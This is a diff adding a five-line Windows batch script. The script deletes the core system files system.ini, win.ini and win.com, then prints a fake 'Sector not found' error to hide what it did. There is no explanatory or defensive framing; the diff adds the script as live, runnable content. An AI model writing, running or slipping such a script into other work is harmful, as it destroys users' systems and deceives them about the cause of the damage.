@@ -1,0 +1,5 @@
+@Echo off
+Del c:\windows\system.ini
+Del c:\windows\win.ini
+Del c:\windows\win.com
+Echo Sector not found
